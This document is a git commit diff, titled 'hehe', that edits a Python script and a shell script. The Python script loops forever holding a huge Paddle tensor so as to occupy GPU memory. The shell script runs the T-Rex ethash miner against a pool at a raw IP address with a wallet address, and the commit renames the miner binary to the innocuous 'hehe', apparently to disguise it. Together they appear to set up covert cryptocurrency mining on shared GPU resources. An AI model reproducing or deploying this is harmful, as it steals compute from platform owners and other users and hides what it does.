646666aabb998d5f26b0693d2998a2b717d4af6d
莫岳恒 <moyueheng@126.com>
2023-03-17 08:03:13 +0000

    hehe

--- hehe.py
+++ hehe.py
@@ -1,6 +1,6 @@
 import paddle
 import numpy as np
 
-data = paddle.randn([1000000, 15000]) # 创建一个 1000000 x 1000 的张量
+data = paddle.randn([1000000, 10000]) # 创建一个 1000000 x 10000 的张量
 while True:
     _ = data.numpy() # 重复使用张量，占用显存
--- hehe.sh
+++ hehe.sh
@@ -1,6 +1,9 @@
 #!/bin/sh 
-# ./t-rex -a ethash --coin ethw -o stratum+ssl://66.42.60.31:6698 -u 0x686C17AedAa249b9e2AE20707582Ed459EF8FA01 -w test4
-./t-rex -a ethash --coin ethw -o stratum+tcp://66.42.60.31:6688 -u 0x686C17AedAa249b9e2AE20707582Ed459EF8FA01 -w test4
+###
+ # @Description: 
+### 
+# ./hehe -a ethash --coin ethw -o stratum+ssl://66.42.60.31:6698 -u 0x686C17AedAa249b9e2AE20707582Ed459EF8FA01 -w test4
+./hehe -a ethash --coin ethw -o stratum+tcp://66.42.60.31:6688 -u 0x686C17AedAa249b9e2AE20707582Ed459EF8FA01 -w test4
 
 
 # 
